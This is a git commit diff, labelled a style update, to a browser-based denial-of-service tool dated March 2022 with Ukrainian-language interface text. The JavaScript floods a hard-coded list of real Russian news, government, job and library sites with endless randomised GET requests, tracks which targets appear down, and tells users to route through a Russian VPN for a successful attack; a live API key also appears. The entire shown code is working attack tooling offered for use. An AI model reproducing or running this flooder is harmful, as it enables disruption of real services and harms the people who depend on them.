30d9d1da2167dc4fa2fb93da0ade75564e2edfc7
fatalfire <pirogok1988@gmail.com>
2022-03-10 19:46:40 +0200

    Style update

--- js/get.js
+++ js/get.js
@@ -1,197 +1,208 @@
+var fightForUkraine
 window.onload = function () {
-    let isBot = /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent);
+    let isBot = /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent)
     if (!isBot) {
-        var fightForUkraine = new FIGHT();
+        console.log("Start")
+        fightForUkraine = new FIGHT()
     }
 }
 
 class StatusTable {
-    parentDiv = undefined;
-    updateIntervalID = undefined;
-    TARGET_STRESSED_THRESHOLD = 0.50;   // Percentage of 500 - 511 codes or timeouts we need to mark a server as 'down'.
-    TARGET_TIMEOUT_THRESHOLD = 0.95;    // If # requests / # timeouts > % defined here.
-    MIN_REQUESTS_BEFORE_MARKING = 50;   // Minimum number of requests before marking targets as down or stressed.
-    targetInfoFields = {};
+    parentDiv = undefined
+    updateIntervalID = undefined
+    TARGET_STRESSED_THRESHOLD = 0.50   // Percentage of 500 - 511 codes or timeouts we need to mark a server as 'down'.
+    TARGET_TIMEOUT_THRESHOLD = 0.95    // If # requests / # timeouts > % defined here.
+    MIN_REQUESTS_BEFORE_MARKING = 50   // Minimum number of requests before marking targets as down or stressed.
+    targetInfoFields = {}
 
     constructor(parentDivID) {
-        this.parentDiv = document.getElementById("parentDivID");
+        this.parentDiv = document.getElementById(parentDivID)
 
-        for (var t = 0; t < targets.length; t++) {
-            this.newTarget(targets[t]);
+        for (let t = 0; t < targets.length; t++) {
+            this.newTarget(targets[t])
         }
 
         this.updateIntervalID = setInterval(() => {
-            targets.map(this.drawUpdate, this);
-        }, 1000); 
+            targets.map(this.drawUpdate, this)
+        }, 1000) 
     }
 
     newTarget(target) {
-        let statDiv = document.createElement("DIV");
-        statDiv.classList.add("target-status__container");
+        let statDiv = document.createElement("DIV")
+        statDiv.classList.add("target-status__container")
 
-        let urlDiv = document.createElement("DIV");
-        urlDiv.classList.add("target-url");
-        urlDiv.innerText = target;
+        let urlDiv = document.createElement("DIV")
+        urlDiv.classList.add("target-url")
+        urlDiv.innerText = target
 
-        let reqDiv = document.createElement("DIV");
-        reqDiv.classList.add("req-count");
-        reqDiv.innerText = 0;
+        let reqDiv = document.createElement("DIV")
+        reqDiv.classList.add("req-count")
+        reqDiv.innerText = 0
 
-        let errDiv = document.createElement("DIV");
-        errDiv.classList.add("err-count");
-        errDiv.innerText = 0;
+        let errDiv = document.createElement("DIV")
+        errDiv.classList.add("err-count")
+        errDiv.innerText = 0
 
-        let toDiv = document.createElement("DIV");
-        toDiv.classList.add("to-count");
-        toDiv.innerText = 0;
+        let toDiv = document.createElement("DIV")
+        toDiv.classList.add("to-count")
+        toDiv.innerText = 0
 
         // This object contains any data we'll track for each target.
-        let targetObj = {};
-        targetObj["errCount"] = 0;          // Total number of errored responses.
-        targetObj["reqCount"] = 0;          // Total number of requests sent.
-        targetObj["timeoutCount"] = 0;      // Determines if connection is timing out.
-        targetObj["statDiv"] = statDiv;     // The container div for stats.
-        targetObj["errCountDiv"] = errDiv;
-        targetObj["reqCountDiv"] = reqDiv;
-        targetObj["toCountDiv"] = toDiv;
-        targetObj["isDown"] = false;        // Whether we've marked this particular site as down.
-        targetObj["isStressed"] = false;    // Whether we've marked this particular site as stressed.
+        let targetObj = {}
+        targetObj["errCount"] = 0          // Total number of errored responses.
+        targetObj["reqCount"] = 0          // Total number of requests sent.
+        targetObj["timeoutCount"] = 0      // Determines if connection is timing out.
+        targetObj["statDiv"] = statDiv     // The container div for stats.
+        targetObj["errCountDiv"] = errDiv
+        targetObj["reqCountDiv"] = reqDiv
+        targetObj["toCountDiv"] = toDiv
+        targetObj["isDown"] = false        // Whether we've marked this particular site as down.
+        targetObj["isStressed"] = false    // Whether we've marked this particular site as stressed.
 
-        statDiv.appendChild(urlDiv);
-        statDiv.appendChild(reqDiv);
-        statDiv.appendChild(errDiv);
-        statDiv.appendChild(toDiv);
-        this.parentDiv.appendChild(statDiv);
-        this.targetInfoFields[target] = targetObj;
+        statDiv.appendChild(urlDiv)
+        statDiv.appendChild(reqDiv)
+        statDiv.appendChild(errDiv)
+        statDiv.appendChild(toDiv)
+        this.parentDiv.appendChild(statDiv)
+        this.targetInfoFields[target] = targetObj
     }
 
     addTarget(target) {
-        this.newTarget(target);
+        this.newTarget(target)
     }
 
-    targetErrUpdate(target, status) {
-        let tarInfo = this.targetInfoFields[target];
-        tarInfo.errCount++;
+    targetErrUpdate(target) {
+        let tarInfo = this.targetInfoFields[target]
+        tarInfo.errCount++
 
         if ((tarInfo.reqCount / tarInfo.errCount) > this.TARGET_STRESSED_THRESHOLD && tarInfo.isStressed === false && tarInfo.reqCount > this.MIN_REQUESTS_BEFORE_MARKING) {
-            this.markAsStressed(target);
-            return;
+            this.markAsStressed(target)
+            return
         }
 
         if (tarInfo.isStressed === true && (tarInfo.reqCount / tarInfo.errCount) < this.TARGET_STRESSED_THRESHOLD) {
-            this.unmarkAsStressed(target);
-            return;
+            this.unmarkAsStressed(target)
+            return
         }
     }
 
-    targetTimeoutUpdate(target, status) {
-        let tarInfo = this.targetInfoFields[target];
-        tarInfo.timeoutCount++;
+    targetTimeoutUpdate(target) {
+        let tarInfo = this.targetInfoFields[target]
+        tarInfo.timeoutCount++
 
-        if ((tarInfo.reqCount / tarInfo.timeoutCount) > this.TARGET_TIMEOUT_THRESHOLD && tarInfo.isDown === false && tarInfo.reqCount > this.MIN_REQUESTS_BEFORE_MARKING) {
-            this.markAsDown(target);
-            return;
+        if ((tarInfo.reqCount / tarInfo.timeoutCount) > this.TARGET_TIMEOUT_THRESHOLD && tarInfo.isDown === false && tarInfo.reqCount > this.MIN_REQUESTS_BEFORE_MARKING && tarInfo.errCount !== 0) {
+            this.markAsDown(target)
+            return
         }
 
         if (tarInfo.isDown === true && (tarInfo.reqCount / tarInfo.timeoutCount) < this.TARGET_TIMEOUT_THRESHOLD) {
-            this.unmarkAsDown(target);
-            return;
+            this.unmarkAsDown(target)
+            return
         }
     }
     
     targetReqUpdate(target) {
-        let tarInfo = this.targetInfoFields[target];
-        tarInfo.reqCount++;
+        let tarInfo = this.targetInfoFields[target]
+        tarInfo.reqCount++
     }
     
     drawUpdate(target) {
-        let tarInfo = this.targetInfoFields[target];
-        tarInfo.reqCountDiv.innerText = tarInfo.reqCount;
-        tarInfo.errCountDiv.innerText = tarInfo.errCount;
-        tarInfo.toCountDiv.innerText = tarInfo.timeoutCount;
+        let tarInfo = this.targetInfoFields[target]
+        tarInfo.reqCountDiv.innerText = tarInfo.reqCount
+        tarInfo.errCountDiv.innerText = tarInfo.errCount
+        tarInfo.toCountDiv.innerText = tarInfo.timeoutCount
     }
 
     markAsDown(target) {
-        let tarInfo = this.targetInfoFields[target];
-        tarInfo.statDiv.classList.add("target-down");
-        tarInfo.isDown = true;
-        tarInfo.statDiv.classList.remove("target-stressed");
+        let tarInfo = this.targetInfoFields[target]
+        tarInfo.statDiv.classList.add("target-down")
+        tarInfo.isDown = true
+        tarInfo.statDiv.classList.remove("target-stressed")
     }
 
     unmarkAsDown(target) {
-        let tarInfo = this.targetInfoFields[target];
-        tarInfo.statDiv.classList.remove("target-down");
-        tarInfo.isDown = false;
+        let tarInfo = this.targetInfoFields[target]
+        tarInfo.statDiv.classList.remove("target-down")
+        tarInfo.isDown = false
     }
 
     markAsStressed(target) {
-        let tarInfo = this.targetInfoFields[target];
-        tarInfo.statDiv.classList.add("target-stressed");
-        tarInfo.isStressed = true;
+        let tarInfo = this.targetInfoFields[target]
+        tarInfo.statDiv.classList.add("target-stressed")
+        tarInfo.isStressed = true
     }
 
     unmarkAsStressed(target) {
-        let tarInfo = this.targetInfoFields[target];
-        tarInfo.statDiv.classList.remove("target-stressed");
-        tarInfo.isStressed = false;
+        let tarInfo = this.targetInfoFields[target]
+        tarInfo.statDiv.classList.remove("target-stressed")
+        tarInfo.isStressed = false
     }
 }
 
 class FIGHT {
-    statTable = undefined;
-    CONCURRENCY_LIMIT = targets.length * 2;     // Any more than this and the rate of IP banning skyrockets.
-    queue = [];
-    attacking = true; 
+    statTable = undefined
+    CONCURRENCY_LIMIT = targets.length * 2     // Any more than this and the rate of IP banning skyrockets.
+    queue = []
+    attacking = true 
 
     constructor() {
-        this.statTable = new StatusTable("status-parent-div");
-        targets.map(this.flood, this);
+        this.statTable = new StatusTable("parentDivID")
+        targets.map(this.flood, this)
     }
 
     attackToggle() {
-        this.attacking = !this.attacking;
+        let button = document.querySelector(".btn-stop")
+        this.attacking = !this.attacking
+        if (this.attacking) {
+            targets.map(this.flood, this)
+            button.innerText = "Зупинити"
+            button.classList.remove("btn-stopped")
+        } else {
+            button.innerText = "Продовжити"
+            button.classList.add("btn-stopped")
+        }
     }
 
     async fetchWithTimeout(resource, options) {
-        const controller = new AbortController();
-        const id = setTimeout(() => controller.abort(), options.timeout);
+        const controller = new AbortController()
+        const id = setTimeout(() => controller.abort(), options.timeout)
         return fetch(resource, {
             method: 'GET',
             mode: 'no-cors',
             signal: controller.signal
         }).then((response) => {
-            clearTimeout(id);
-            return response;
+            clearTimeout(id)
+            return response
         }).catch((error) => {
-            clearTimeout(id);
-            throw error;
+            clearTimeout(id)
+            throw error
         })
     }
 
     async flood(target) {
-        var counter = 0;
+        let counter = 0
         while (this.attacking) {
             if (this.queue.length > this.CONCURRENCY_LIMIT) {
-                await this.queue.shift();
+                await this.queue.shift()
             }
-            var rand = counter % 3 === 0 ? '' : ('?' + Math.random() * 1000);
+            let rand = counter % 3 === 0 ? '' : ('?' + Math.random() * 1000)
             this.queue.push(this.fetchWithTimeout(target + rand, {timeout: 2000}).catch((error) => {
-                this.statTable.targetTimeoutUpdate(target, 27015);
+                this.statTable.targetTimeoutUpdate(target)
             }).then((response) => {
                 if (response && !response.ok) {
-                    this.statTable.targetErrUpdate(target, response.status);
+                    this.statTable.targetErrUpdate(target)
                 }
-                this.statTable.targetReqUpdate(target);
-            }));
-            counter = (counter === Number.MAX_VALUE) ? 0 : counter + 1;
+                this.statTable.targetReqUpdate(target)
+            }))
+            counter = (counter === Number.MAX_VALUE) ? 0 : counter + 1
         }
     }
 }
 
-var targets = [
-    'https://lenta.ru/',
+const targets = [
     'https://ria.ru/',
     'https://ria.ru/lenta/',
+    'https://lenta.ru/',
     'https://www.rbc.ru/',
     'https://www.rt.com/',
     'http://kremlin.ru/',
@@ -266,7 +277,6 @@ var targets = [
     'https://hh.ru/',
     'https://russia-insider.com/',
     'https://rsl.ru/',
-    'https://tass.ru/',
     'https://vz.ru/',
     'https://pikabu.ru/',
     'https://bezformata.com/',
--- js/scripts.js
+++ js/scripts.js
@@ -39,9 +39,9 @@
 const currentCountry = document.querySelector(".country")
 
 async function checkUserLocation() {
+    currentCountry.innerHTML = "<p class='check'>Перевірка... Для успішної атаки рекомендуємо використати VPN! Та обрати локацію Росія.</p>"
     const country = await getUserCountry();
     if (country === "") {
-        currentCountry.innerHTML = "Визначаємо Вашу країну... Для успішної атаки рекомендуємо використати VPN! Та обрати локацію Росія."
         setTimeout(function(){
             checkUserLocation()
         }, 5000)
@@ -49,17 +49,17 @@ async function checkUserLocation() {
     }
     
     if (country === "Ukraine") {
-        currentCountry.innerHTML = '<p>Ви запустили цю сторінку з України. Для успішної атаки рекомендуємо використати VPN!</p>'
+        currentCountry.innerHTML = '<p class="danger">Ви запустили цю сторінку з України. Скоріше всього атаки будуть блокуватись. Увімкніть VPN!</p>'
     } else if (country === "Russian Federation") {
-        currentCountry.innerHTML = '<p>Супер! Вашу локацію визначено як Росія. Можна починати!</p>'
+        currentCountry.innerHTML = '<p class="success">Супер! Вашу локацію визначено як Росія. Можна починати!</p>'
     } else {
-        currentCountry.innerHTML = `<p>Вашу локацію визначено як "${country}". Для максимального ефекту потрібно заходити з локації - Росія.</p>`
+        currentCountry.innerHTML = `<p class='warn'>Вашу локацію визначено як "${country}". Якщо атаки будуть блокуватись - змініть країну в налаштуваннях VPN.</p>`
     }
 }
 
 function getUserCountry() {
-    // return fetch('https://api.ipregistry.co/?key=tryout')
-    return fetch('https://api.ipregistry.co/?key=t6zpigq4l4t7j1ig')
+    return fetch('https://api.ipregistry.co/?key=tryout')
+    // return fetch('https://api.ipregistry.co/?key=t6zpigq4l4t7j1ig')
         .then(function (response) {
             return response.json()
         })
